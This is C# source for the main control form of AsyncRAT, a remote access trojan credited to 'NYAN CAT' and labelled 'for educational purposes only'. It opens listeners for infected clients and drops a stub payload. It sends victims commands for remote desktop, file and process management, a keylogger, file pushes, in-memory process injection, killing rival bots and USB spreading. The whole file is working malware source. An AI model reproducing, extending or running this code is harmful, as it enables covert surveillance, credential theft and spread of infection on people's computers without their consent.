﻿using System;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System.Threading.Tasks;
using Microsoft.VisualBasic;
using System.Linq;
using System.Threading;
using System.Drawing;
using System.IO;
using AsyncRAT_Sharp.Forms;
using AsyncRAT_Sharp.Cryptography;
using System.Diagnostics;

//       │ Author     : NYAN CAT
//       │ Name       : AsyncRAT // Simple Socket

//       Contact Me   : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.

namespace AsyncRAT_Sharp
{

    public partial class Form1 : Form
    {
        private static Builder builder = new Builder();
        public Form1()
        {
            CheckFiles();
            InitializeComponent();
            this.Opacity = 0;
        }

        private Listener listener;

        private void CheckFiles()
        {
            try
            {
                if (!File.Exists(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config")))
                {
                    File.WriteAllText(Path.Combine(Application.StartupPath, Path.GetFileName(Application.ExecutablePath) + ".config"), Properties.Resources.AsyncRAT_Sharp_exe);
                    Process.Start(Application.ExecutablePath);
                    Environment.Exit(0);
                }

                if (!File.Exists(Path.Combine(Application.StartupPath, "cGeoIp.dll")))
                    File.WriteAllBytes(Path.Combine(Application.StartupPath, "cGeoIp.dll"), Properties.Resources.cGeoIp);

                if (!File.Exists(Path.Combine(Application.StartupPath, "dnlib.dll")))
                    File.WriteAllBytes(Path.Combine(Application.StartupPath, "dnlib.dll"), Properties.Resources.dnlib);

                if (!Directory.Exists(Path.Combine(Application.StartupPath, "Stub")))
                    Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Stub"));

                if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
                    File.WriteAllBytes(Path.Combine(Application.StartupPath, "Stub\\Stub.exe"), Properties.Resources.Stub);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Text = $"{Settings.Version} // NYAN CAT";

            PortsFrm portsFrm = new PortsFrm();
            portsFrm.ShowDialog();

            Methods.FadeIn(this, 5);
            Settings.Port = portsFrm.textPorts.Text;
            Settings.Password = portsFrm.textPassword.Text;
            Settings.aes256 = new Aes256(Settings.Password);

            string[] P = Settings.Port.Split(',');
            foreach (var PORT in P)
            {
                if (!string.IsNullOrWhiteSpace(PORT))
                {
                    listener = new Listener();
                    Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
                    thread.Start(Convert.ToInt32(PORT.ToString().Trim()));
                }
            }
        }


        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Environment.Exit(0);
        }


        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (listView1.Items.Count > 0)
                if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
                    foreach (ListViewItem x in listView1.Items)
                        x.Selected = true;
        }


        private void listView1_MouseMove(object sender, MouseEventArgs e)
        {
            if (listView1.Items.Count > 1)
            {
                ListViewHitTestInfo hitInfo = listView1.HitTest(e.Location);
                if (e.Button == MouseButtons.Left && (hitInfo.Item != null || hitInfo.SubItem != null))
                    listView1.Items[hitInfo.Item.Index].Selected = true;
            }
        }


        private async void ping_Tick(object sender, EventArgs e)
        {
            if (Settings.Online.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                foreach (Clients CL in Settings.Online.ToList())
                {
                    await Task.Run(() =>
                    {
                        CL.BeginSend(msgpack.Encode2Bytes());
                    });
                }
            }
        }


        private void UpdateUI_Tick(object sender, EventArgs e)
        {
            toolStripStatusLabel1.Text = $"Online {Settings.Online.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.Sent).ToString()}     Received {Methods.BytesToString(Settings.Received).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
        }

        private void cLOSEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "close";
                foreach (ListViewItem C in listView1.SelectedItems)
                {
                    Clients CL = (Clients)C.Tag;
                    ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                }
            }
        }

        private void sENDMESSAGEBOXToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                string Msgbox = Interaction.InputBox("Message", "Message", "Hello World!");
                if (string.IsNullOrEmpty(Msgbox))
                    return;
                else
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "sendMessage";
                    msgpack.ForcePathObject("Message").AsString = Msgbox;
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        Clients CL = (Clients)C.Tag;
                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                    }
                }
            }
        }

        private async void sENDFILEToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    OpenFileDialog O = new OpenFileDialog();
                    if (O.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "sendFile";
                        await msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
                        msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(O.FileName);
                        msgpack.ForcePathObject("Update").AsString = "false";
                        foreach (ListViewItem C in listView1.SelectedItems)
                        {
                            Clients CL = (Clients)C.Tag;
                            CL.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void uNISTALLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "uninstall";
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        Clients CL = (Clients)C.Tag;
                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private async void uPDATEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    OpenFileDialog O = new OpenFileDialog();
                    if (O.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "sendFile";
                        await msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
                        msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(O.FileName);
                        msgpack.ForcePathObject("Update").AsString = "true";
                        foreach (ListViewItem C in listView1.SelectedItems)
                        {
                            Clients CL = (Clients)C.Tag;
                            CL.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void sENDFILETOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    SendFileToMemory SF = new SendFileToMemory();
                    SF.ShowDialog();
                    if (SF.toolStripStatusLabel1.Text.Length > 0 && SF.toolStripStatusLabel1.ForeColor == Color.Green)
                    {
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "sendMemory";
                        msgpack.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(SF.toolStripStatusLabel1.Tag.ToString()));
                        if (SF.comboBox1.SelectedIndex == 0)
                        {
                            msgpack.ForcePathObject("Inject").AsString = "";
                            msgpack.ForcePathObject("Plugin").SetAsBytes(new byte[1]);
                        }
                        else
                        {
                            msgpack.ForcePathObject("Inject").AsString = SF.comboBox2.Text;
                            msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
                        }

                        foreach (ListViewItem C in listView1.SelectedItems)
                        {
                            Clients CL = (Clients)C.Tag;
                            CL.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                        }
                    }
                    SF.Close();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void rEMOTEDESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                    msgpack.ForcePathObject("Option").AsString = "true";
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        Clients CL = (Clients)C.Tag;
                        this.BeginInvoke((MethodInvoker)(() =>
                        {
                            RemoteDesktop RD = (RemoteDesktop)Application.OpenForms["RemoteDesktop:" + CL.ID];
                            if (RD == null)
                            {
                                RD = new RemoteDesktop
                                {
                                    Name = "RemoteDesktop:" + CL.ID,
                                    F = this,
                                    Text = "RemoteDesktop:" + CL.ID,
                                    C = CL,
                                    Active = true
                                };
                                RD.Show();
                                ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                            }
                        }));
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }

        }

        private void pROCESSMANAGERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "processManager";
                    msgpack.ForcePathObject("Option").AsString = "List";
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        Clients CL = (Clients)C.Tag;
                        this.BeginInvoke((MethodInvoker)(() =>
                        {
                            ProcessManager PM = (ProcessManager)Application.OpenForms["processManager:" + CL.ID];
                            if (PM == null)
                            {
                                PM = new ProcessManager
                                {
                                    Name = "processManager:" + CL.ID,
                                    Text = "processManager:" + CL.ID,
                                    F = this,
                                    C = CL
                                };
                                PM.Show();
                                ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                            }
                        }));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            builder.ShowDialog();
        }

        private void fILEMANAGERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
                    msgpack.ForcePathObject("Command").AsString = "getDrivers";
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        Clients CL = (Clients)C.Tag;
                        this.BeginInvoke((MethodInvoker)(() =>
                        {
                            FileManager FM = (FileManager)Application.OpenForms["fileManager:" + CL.ID];
                            if (FM == null)
                            {
                                FM = new FileManager
                                {
                                    Name = "fileManager:" + CL.ID,
                                    Text = "fileManager:" + CL.ID,
                                    F = this,
                                    C = CL
                                };
                                FM.Show();
                                ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                            }
                        }));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void KEYLOGGERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.SelectedItems.Count > 0)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                    msgpack.ForcePathObject("isON").AsString = "true";
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        Clients CL = (Clients)C.Tag;
                        this.BeginInvoke((MethodInvoker)(() =>
                        {
                            Keylogger KL = (Keylogger)Application.OpenForms["keyLogger:" + CL.ID];
                            if (KL == null)
                            {
                                KL = new Keylogger
                                {
                                    Name = "keyLogger:" + CL.ID,
                                    Text = "keyLogger:" + CL.ID,
                                    F = this,
                                    C = CL
                                };
                                KL.Show();
                                ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                            }
                        }));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void BOTKILLERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "botKiller";
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        Clients CL = (Clients)C.Tag;
                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }

        private void USBSPREADToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "usbSpread";
                    foreach (ListViewItem C in listView1.SelectedItems)
                    {
                        Clients CL = (Clients)C.Tag;
                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }
        }
    }
}
